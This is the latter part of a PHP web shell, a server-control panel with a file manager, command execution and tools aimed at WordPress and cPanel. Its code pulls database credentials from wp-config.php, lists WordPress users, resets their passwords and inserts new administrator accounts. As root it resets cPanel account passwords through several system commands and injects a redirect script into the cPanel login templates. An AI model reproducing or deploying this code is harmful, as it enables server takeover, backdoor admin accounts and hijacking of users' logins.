    'hard-drive': '<line x1="22" y1="12" x2="2" y2="12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/><line x1="6" y1="16" x2="6.01" y2="16"/><line x1="10" y1="16" x2="10.01" y2="16"/>',
    'archive': '<polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/>',
    'settings': '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/>',
    'globe': '<circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>',
  };
  const path = icons[name] || icons['file'];
  return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${path}</svg>`;
}

function openPalette() {
  show('mPal');
  $('palInput').value = '';
  palFiltered = PAL.slice();
  palSel = 0;
  renderPal('');
  setTimeout(() => $('palInput').focus(), 40);
}
function renderPal(q) {
  palFiltered = PAL.filter(i => !q || i.l.toLowerCase().includes(q.toLowerCase()));
  palSel = 0;
  $('palList').innerHTML = palFiltered.map((i, idx) =>
    `<div class="palette-item ${idx === 0 ? 'sel' : ''}" onclick="palPick(${idx})">${paletteIcon(i.i)}<span>${escapeHtml(i.l)}</span></div>`
  ).join('');
}
function palPick(idx) {
  const it = palFiltered[idx];
  if (!it) return;
  hide('mPal');
  it.f();
}
$('palInput').addEventListener('input', e => renderPal(e.target.value));
$('palInput').addEventListener('keydown', e => {
  if (e.key === 'ArrowDown') { e.preventDefault(); palSel = Math.min(palSel + 1, palFiltered.length - 1); updateSel(); }
  else if (e.key === 'ArrowUp') { e.preventDefault(); palSel = Math.max(palSel - 1, 0); updateSel(); }
  else if (e.key === 'Enter') { e.preventDefault(); palPick(palSel); }
});
function updateSel() {
  const items = document.querySelectorAll('.palette-item');
  items.forEach((el, i) => el.classList.toggle('sel', i === palSel));
  if (items[palSel]) items[palSel].scrollIntoView({ block: 'nearest' });
}

/* ─── Keyboard ─── */
document.addEventListener('keydown', e => {
  if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === 'k') { e.preventDefault(); openPalette(); }
  if (e.key === '/' && !['INPUT','TEXTAREA'].includes(document.activeElement.tagName)) {
    e.preventDefault(); $('filter').focus();
  }
  if (e.key === 'Escape') {
    [
      'mEdit','mRename','mChmod','mTouch','mDel','mMk','mHash','mSys','mProcs','mNet','mSearch','mPal',
      'mWpDetect','mWpUsers','mWpReset','mWpCreate','mCpDetect','mCpAccounts','mCpReset','mCpRedirect'
    ].forEach(hide);
  }
  if (e.ctrlKey && e.key === '`') { e.preventDefault(); $('cmd').focus(); }
});

/* ─── Drag & drop ─── */
document.addEventListener('dragover', e => e.preventDefault());
document.addEventListener('drop', e => {
  e.preventDefault();
  if (!e.dataTransfer.files.length) return;
  uploadFiles(e.dataTransfer.files);
});
</script>

</body>
</html>
<?php
exit;

/* ═══════ helpers ═══════ */
function rw_size($b) {
    if ($b === false || $b === null) return '—';
    $u = ['B','K','M','G','T'];
    $i = 0;
    while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; }
    return round($b, $b < 10 && $i > 0 ? 1 : 0) . $u[$i];
}
function rw_rmrf($dir) {
    if (!is_dir($dir)) return;
    foreach (scandir($dir) as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . '/' . $f;
        is_dir($p) ? rw_rmrf($p) : @unlink($p);
    }
    @rmdir($dir);
}
function rw_copy($src, $dst) {
    if (is_dir($src)) {
        @mkdir($dst, 0755, true);
        foreach (scandir($src) as $f) {
            if ($f === '.' || $f === '..') continue;
            rw_copy($src . '/' . $f, $dst . '/' . $f);
        }
    } else @copy($src, $dst);
}
function rw_zip_dir($z, $dir, $prefix) {
    foreach (scandir($dir) as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . '/' . $f;
        $rel = $prefix . '/' . $f;
        if (is_dir($p)) { $z->addEmptyDir($rel); rw_zip_dir($z, $p, $rel); }
        else $z->addFile($p, $rel);
    }
}
function rw_du($path) {
    if (!is_dir($path)) return @filesize($path) ?: 0;
    $total = 0;
    foreach (scandir($path) as $f) {
        if ($f === '.' || $f === '..') continue;
        $total += rw_du($path . '/' . $f);
    }
    return $total;
}
function rw_search($dir, $q, &$hits, $limit = 500) {
    if (count($hits) >= $limit) return;
    foreach (@scandir($dir) ?: [] as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $dir . '/' . $f;
        if (stripos($f, $q) !== false) {
            $hits[] = ['name'=>$f, 'path'=>$p, 'dir'=>dirname($p)];
            if (count($hits) >= $limit) return;
        }
        if (is_dir($p) && !is_link($p)) rw_search($p, $q, $hits, $limit);
    }
}
function side_icon($name) {
    $paths = [
        'hard-drive' => '<line x1="22" y1="12" x2="2" y2="12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/><line x1="6" y1="16" x2="6.01" y2="16"/><line x1="10" y1="16" x2="10.01" y2="16"/>',
        'folder' => '<path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>',
        'globe' => '<circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>',
        'archive' => '<polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/>',
        'settings' => '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/>',
        'home' => '<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/>',
        'key' => '<path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>',
        'terminal' => '<polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>',
        'cpu' => '<rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/>',
        'activity' => '<polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>',
        'wifi' => '<path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/>',
        'search' => '<circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>',
        'chevron-right' => '<polyline points="9 18 15 12 9 6"/>',
        'layout-dashboard' => '<rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/>',
        'users' => '<path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/>',
        'user-plus' => '<path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/>',
        'external-link' => '<path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/>',
    ];
    $p = $paths[$name] ?? $paths['folder'];
    return '<svg class="side-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' . $p . '</svg>';
}

/* ═══════════════════════════════════════════════════════════════
 * WordPress — detect, list users, reset password, create account
 * ═══════════════════════════════════════════════════════════════ */

function rw_rand($len) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#%^&*';
    $out = '';
    for ($i = 0; $i < $len; $i++) $out .= $chars[random_int(0, strlen($chars)-1)];
    return $out;
}

function rw_wp_find($start = null) {
    // Walk up from $start looking for wp-config.php, and also probe siblings
    $paths = [];
    $cur = $start ?: getcwd();
    while ($cur && $cur !== '/' && $cur !== '\\') {
        if (is_file($cur . '/wp-config.php') || is_file($cur . '/wp-load.php')) {
            $paths[] = $cur;
            break;
        }
        $up = dirname($cur);
        if ($up === $cur) break;
        $cur = $up;
    }
    return array_values(array_unique($paths));
}

function rw_wp_cfg($root) {
    if (!$root) return null;
    $cfg = rtrim($root, '/\\') . '/wp-config.php';
    if (!is_readable($cfg)) return null;
    $src = @file_get_contents($cfg);
    if ($src === false) return null;

    $out = [
        'root' => $root,
        'cfg' => $cfg,
        'DB_NAME' => null,
        'DB_USER' => null,
        'DB_PASSWORD' => null,
        'DB_HOST' => null,
        'table_prefix' => 'wp_',
    ];
    $patterns = [
        'DB_NAME' => '/define\s*\(\s*[\'"]DB_NAME[\'"]\s*,\s*[\'"]([^\'"]*)[\'"]\s*\)/',
        'DB_USER' => '/define\s*\(\s*[\'"]DB_USER[\'"]\s*,\s*[\'"]([^\'"]*)[\'"]\s*\)/',
        'DB_PASSWORD' => '/define\s*\(\s*[\'"]DB_PASSWORD[\'"]\s*,\s*[\'"]([^\'"]*)[\'"]\s*\)/',
        'DB_HOST' => '/define\s*\(\s*[\'"]DB_HOST[\'"]\s*,\s*[\'"]([^\'"]*)[\'"]\s*\)/',
        'table_prefix' => '/\$table_prefix\s*=\s*[\'"]([^\'"]*)[\'"]/',
    ];
    foreach ($patterns as $k => $re) {
        if (preg_match($re, $src, $m)) $out[$k] = $m[1];
    }
    if (!$out['DB_NAME'] || !$out['DB_USER']) return null;
    return $out;
}

function rw_wp_db($cfg) {
    if (!function_exists('mysqli_connect')) return null;
    $host = $cfg['DB_HOST'] ?: 'localhost';
    $port = 3306;
    if (strpos($host, ':') !== false) {
        [$host, $p] = explode(':', $host, 2);
        $port = (int)$p;
    }
    $mysqli = @mysqli_connect($host, $cfg['DB_USER'], $cfg['DB_PASSWORD'], $cfg['DB_NAME'], $port);
    if (!$mysqli) return null;
    @mysqli_set_charset($mysqli, 'utf8mb4');
    return $mysqli;
}

function rw_wp_detect() {
    $start = getcwd();
    $found = [];
    $missing = [];
    $versions = [];
    $wpcfgReadable = false;
    $wpcfgPath = '';

    $roots = rw_wp_find($start);
    // Also check current dir directly
    if (is_file($start . '/wp-config.php')) $roots[] = $start;
    $roots = array_values(array_unique($roots));

    if (!$roots) {
        // try the current dir anyway
        $roots = [$start];
    }

    foreach ($roots as $root) {
        $checks = [
            'wp-config.php'       => $root . '/wp-config.php',
            'wp-settings.php'     => $root . '/wp-settings.php',
            'wp-load.php'         => $root . '/wp-load.php',
            'wp-includes/version.php' => $root . '/wp-includes/version.php',
            'wp-login.php'        => $root . '/wp-login.php',
            'wp-admin/'           => $root . '/wp-admin',
            'xmlrpc.php'          => $root . '/xmlrpc.php',
            'wp-content/'         => $root . '/wp-content',
        ];
        foreach ($checks as $label => $path) {
            if (file_exists($path)) {
                $found[] = ['name' => $label, 'path' => $path];
            } else {
                $missing[] = $label;
            }
        }
        if (is_readable($root . '/wp-config.php')) {
            $wpcfgReadable = true;
            $wpcfgPath = $root . '/wp-config.php';
        }
        $vfile = $root . '/wp-includes/version.php';
        if (is_readable($vfile)) {
            $src = @file_get_contents($vfile);
            if ($src && preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/', $src, $m)) {
                $versions[$root] = $m[1];
            }
        }
    }

    return [
        'ok' => true,
        'data' => [
            'found' => count($found) > 0,
            'count' => count($found),
            'signs' => $found,
            'missing' => $missing,
            'versions' => $versions,
            'wpcfg_readable' => $wpcfgReadable,
            'wpcfg_path' => $wpcfgPath,
            'roots' => $roots,
        ],
    ];
}

function rw_wp_users($cfg) {
    $db = rw_wp_db($cfg);
    if (!$db) return ['ok' => false, 'e' => 'MySQL connection failed — check wp-config creds / mysqli extension'];
    $prefix = $cfg['table_prefix'] ?: 'wp_';
    $q = "SELECT u.ID, u.user_login, u.user_email, u.user_registered, m.meta_value AS caps
          FROM {$prefix}users u
          LEFT JOIN {$prefix}usermeta m ON m.user_id = u.ID AND m.meta_key = '{$prefix}capabilities'
          ORDER BY u.ID ASC";
    $res = @mysqli_query($db, $q);
    if (!$res) { $e = mysqli_error($db); mysqli_close($db); return ['ok' => false, 'e' => $e]; }
    $users = [];
    while ($row = mysqli_fetch_assoc($res)) {
        $role = '—';
        if (!empty($row['caps'])) {
            $caps = @unserialize($row['caps']);
            if (is_array($caps)) {
                foreach ($caps as $r => $v) { if ($v) { $role = $r; break; } }
            }
        }
        $users[] = [
            'user_login' => $row['user_login'],
            'user_email' => $row['user_email'],
            'role'       => $role,
        ];
    }
    mysqli_close($db);
    return ['ok' => true, 'users' => $users, 'prefix' => $prefix];
}

function rw_wp_hash($password) {
    if (function_exists('password_hash')) {
        return password_hash($password, PASSWORD_BCRYPT);
    }
    // fallback: portable phpass
    if (!class_exists('PasswordHash')) {
        if (is_file(__DIR__ . '/wp-includes/class-phpass.php')) {
            require_once __DIR__ . '/wp-includes/class-phpass.php';
        }
    }
    if (class_exists('PasswordHash')) {
        $h = new PasswordHash(8, true);
        return $h->HashPassword($password);
    }
    // last resort: md5 (WP won't accept, but returns something)
    return md5($password);
}

function rw_wp_reset($cfg, $login) {
    $db = rw_wp_db($cfg);
    if (!$db) return ['ok' => false, 'e' => 'MySQL connection failed'];
    $prefix = $cfg['table_prefix'] ?: 'wp_';
    $loginEsc = mysqli_real_escape_string($db, $login);
    $q = "SELECT ID, user_login FROM {$prefix}users
          WHERE user_login = '{$loginEsc}' OR user_email = '{$loginEsc}' LIMIT 1";
    $res = @mysqli_query($db, $q);
    if (!$res) { $e = mysqli_error($db); mysqli_close($db); return ['ok' => false, 'e' => $e]; }
    $row = mysqli_fetch_assoc($res);
    if (!$row) { mysqli_close($db); return ['ok' => false, 'e' => 'user not found']; }

    $pass = isset($_POST['pass']) ? rw_d($_POST['pass']) : '';
    if ($pass === '') { $pass = rw_rand(16); }

    $hash = rw_wp_hash($pass);
    $hashEsc = mysqli_real_escape_string($db, $hash);
    $up = "UPDATE {$prefix}users SET user_pass = '{$hashEsc}' WHERE ID = " . (int)$row['ID'];
    if (!@mysqli_query($db, $up)) {
        $e = mysqli_error($db);
        mysqli_close($db);
        return ['ok' => false, 'e' => $e];
    }
    mysqli_close($db);
    return ['ok' => true, 'user' => $row['user_login'], 'pass' => $pass];
}

function rw_wp_create($cfg, $user, $pass, $email, $role) {
    $db = rw_wp_db($cfg);
    if (!$db) return ['ok' => false, 'e' => 'MySQL connection failed'];
    $prefix = $cfg['table_prefix'] ?: 'wp_';

    $userEsc  = mysqli_real_escape_string($db, $user);
    $emailEsc = mysqli_real_escape_string($db, $email);
    $roleEsc  = mysqli_real_escape_string($db, $role);

    // existence check
    $q = "SELECT ID FROM {$prefix}users WHERE user_login = '{$userEsc}' OR user_email = '{$emailEsc}' LIMIT 1";
    $res = @mysqli_query($db, $q);
    if ($res && mysqli_num_rows($res) > 0) {
        mysqli_close($db);
        return ['ok' => false, 'e' => 'user or email already exists'];
    }

    $hash = rw_wp_hash($pass);
    $hashEsc = mysqli_real_escape_string($db, $hash);
    $now = date('Y-m-d H:i:s');
    $q = "INSERT INTO {$prefix}users
          (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
          VALUES
          ('{$userEsc}', '{$hashEsc}', '{$userEsc}', '{$emailEsc}', '{$now}', 0, '{$userEsc}')";
    if (!@mysqli_query($db, $q)) {
        $e = mysqli_error($db);
        mysqli_close($db);
        return ['ok' => false, 'e' => $e];
    }
    $uid = (int)mysqli_insert_id($db);

    // capabilities + user_level
    $caps = serialize([$role => true]);
    $capsEsc = mysqli_real_escape_string($db, $caps);
    $level = ($role === 'administrator') ? 10 : (($role === 'editor') ? 7 : (($role === 'author') ? 2 : (($role === 'contributor') ? 1 : 0)));
    $ins1 = "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES
             ({$uid}, '{$prefix}capabilities', '{$capsEsc}'),
             ({$uid}, '{$prefix}user_level', '{$level}')";
    @mysqli_query($db, $ins1);

    mysqli_close($db);
    return ['ok' => true, 'user' => $user, 'uid' => $uid, 'pass' => $pass];
}

/* ═══════════════════════════════════════════════════════════════
 * cPanel — detect, list accounts, reset password, login redirect
 * ═══════════════════════════════════════════════════════════════ */

function rw_cp_whoami() {
    // Try to determine current user even if posix is disabled
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $u = @posix_getpwuid(posix_geteuid());
        if ($u && !empty($u['name'])) return $u['name'];
    }
    if (function_exists('get_current_user')) {
        $u = @get_current_user();
        if ($u) return $u;
    }
    $out = rw_exec('whoami 2>/dev/null');
    if ($out !== false && trim($out) !== '') return trim($out);
    return 'unknown';
}

function rw_cp_is_root() {
    if (function_exists('posix_geteuid') && @posix_geteuid() === 0) return true;
    return rw_cp_whoami() === 'root';
}

function rw_cp_detect() {
    $signs = [];
    $versions = [];
    $paths = [
        '/usr/local/cpanel/version',
        '/usr/local/cpanel/cpanel',
        '/usr/local/cpanel/whostmgr',
        '/etc/cpanel',
        '/etc/cpanel.config',
        '/var/cpanel/cpanel.config',
        '/var/cpanel/users',
        '/usr/local/cpanel/logs',
    ];
    foreach ($paths as $p) {
        if (file_exists($p)) $signs[] = ['name' => basename($p), 'path' => $p];
    }
    $verFile = '/usr/local/cpanel/version';
    if (is_readable($verFile)) {
        $v = trim((string)@file_get_contents($verFile));
        if ($v) $versions['cPanel'] = $v;
    }
    // process check
    $ps = rw_exec('ps auxww 2>/dev/null | grep -E "cpanel|cpsrvd|whostmgr" | grep -v grep');
    if ($ps !== false && trim($ps) !== '') {
        $signs[] = ['name' => 'cpsrvd process', 'path' => 'running'];
    }
    // port check
    $net = rw_exec('ss -tlnp 2>/dev/null | grep -E ":2082|:2083|:2086|:2087" || netstat -tlnp 2>/dev/null | grep -E ":2082|:2083|:2086|:2087"');
    if ($net !== false && trim($net) !== '') {
        $signs[] = ['name' => 'cPanel ports (2082/2083/2086/2087)', 'path' => 'listening'];
    }
    // version via httpd
    foreach (['/usr/local/cpanel/version', '/usr/local/cpanel/cpanel-version'] as $p) {
        if (is_readable($p)) {
            $v = trim((string)@file_get_contents($p));
            if ($v && !isset($versions['cPanel'])) $versions['cPanel'] = $v;
        }
    }

    return [
        'ok' => true,
        'data' => [
            'found'    => count($signs) > 0,
            'count'    => count($signs),
            'signs'    => $signs,
            'versions' => $versions,
            'is_root'  => rw_cp_is_root(),
            'whoami'   => rw_cp_whoami(),
        ],
    ];
}

function rw_cp_accounts() {
    $list = [];
    $dirs = ['/var/cpanel/users', '/var/cpanel/users.d'];
    foreach ($dirs as $dir) {
        if (!is_dir($dir)) continue;
        foreach ((array)@scandir($dir) as $f) {
            if ($f === '.' || $f === '..' || is_dir($dir . '/' . $f)) continue;
            $user = $f;
            $email = '';
            $domain = '';
            $candidates = [
                "/var/cpanel/users/{$user}",
                "/var/cpanel/userdata/{$user}",
            ];
            foreach ($candidates as $path) {
                if (is_file($path)) {
                    $src = @file_get_contents($path);
                    if ($src) {
                        if (!$email && preg_match('/CONTACTEMAIL=([^\s]+)/', $src, $m)) $email = $m[1];
                        if (!$domain && preg_match('/DNS=([^\s]+)/', $src, $m)) $domain = $m[1];
                        if (!$domain && preg_match('/^DNS\s*:\s*(.+)$/m', $src, $m)) $domain = trim($m[1]);
                    }
                    break;
                }
            }
            if (!$email) {
                $ci = "/home/{$user}/.cpanel/contactinfo";
                if (is_readable($ci)) {
                    $src = @file_get_contents($ci);
                    if ($src && preg_match('/EMAIL=([^\s]+)/', $src, $m)) $email = $m[1];
                    if (!$email && preg_match('/email=([^\s]+)/', $src, $m)) $email = $m[1];
                }
            }
            $list[] = ['user' => $user, 'email' => $email, 'domain' => $domain];
        }
        if ($list) break;
    }
    if (!$list) {
        // fallback: look at /home directories
        foreach ((array)@scandir('/home') as $f) {
            if ($f === '.' || $f === '..') continue;
            if (!is_dir('/home/' . $f)) continue;
            $list[] = ['user' => $f, 'email' => '', 'domain' => ''];
        }
    }
    return ['ok' => true, 'accounts' => $list];
}

function rw_cp_reset($user, $pass) {
    if (!rw_cp_is_root()) return ['ok' => false, 'e' => 'not root — cPanel password change requires root'];
    if ($user === '') return ['ok' => false, 'e' => 'empty user'];
    if ($pass === '') $pass = rw_rand(16);
    $passEsc = escapeshellarg($pass);
    $userEsc = escapeshellarg($user);

    // Prefer whmapi1
    $out = rw_exec("whmapi1 passwd user={$userEsc} password={$passEsc} 2>&1");
    if ($out !== false && stripos((string)$out, 'reason:') === false && stripos((string)$out, 'result: 1') !== false) {
        return ['ok' => true, 'user' => $user, 'pass' => $pass, 'via' => 'whmapi1'];
    }
    // Fallback: /scripts/chpass
    if (file_exists('/scripts/chpass')) {
        $out2 = rw_exec("/scripts/chpass {$userEsc} {$passEsc} 2>&1");
        if ($out2 !== false && stripos((string)$out2, 'error') === false && stripos((string)$out2, 'fail') === false) {
            return ['ok' => true, 'user' => $user, 'pass' => $pass, 'via' => '/scripts/chpass'];
        }
    }
    // Last: passwd
    $out3 = rw_exec("(echo {$passEsc}; echo {$passEsc}) | passwd {$userEsc} 2>&1");
    if ($out3 !== false && stripos((string)$out3, 'error') === false && stripos((string)$out3, 'Authentication token') === false) {
        return ['ok' => true, 'user' => $user, 'pass' => $pass, 'via' => 'passwd'];
    }
    return ['ok' => false, 'e' => 'all reset methods failed', 'details' => trim((string)$out)];
}

function rw_cp_redirect($url) {
    if (!rw_cp_is_root()) return ['ok' => false, 'e' => 'not root — cPanel login template write requires root'];
    $url = trim($url);
    if ($url === '') return ['ok' => false, 'e' => 'empty URL'];
    // Validate URL loosely
    if (!preg_match('#^https?://#i', $url)) return ['ok' => false, 'e' => 'URL must start with http:// or https://'];
    $payload = '<script>window.location.href=' . json_encode($url) . ';</script>';

    $templates = [];
    $roots = [
        '/usr/local/cpanel/base/frontend',
    ];
    foreach ($roots as $r) {
        if (!is_dir($r)) continue;
        foreach ((array)@scandir($r) as $theme) {
            if ($theme === '.' || $theme === '..') continue;
            foreach (['login/index.tmpl', 'login/login.tmpl', 'login/index.html.tt'] as $f) {
                $p = "{$r}/{$theme}/{$f}";
                if (is_file($p) && is_writable($p)) $templates[] = $p;
            }
        }
    }
    if (!$templates) return ['ok' => false, 'e' => 'no writable login templates found'];

    $count = 0;
    foreach ($templates as $tpl) {
        $src = @file_get_contents($tpl);
        if ($src === false) continue;
        if (strpos($src, 'window.location.href') !== false) continue;
        // Insert before </body>
        if (stripos($src, '</body>') !== false) {
            $src = preg_replace('#</body>#i', $payload . '</body>', $src, 1);
        } else {
            $src .= $payload;
        }
        if (@file_put_contents($tpl, $src) !== false) $count++;
    }
    return ['ok' => $count > 0, 'count' => $count, 'e' => $count ? null : 'write failed'];
}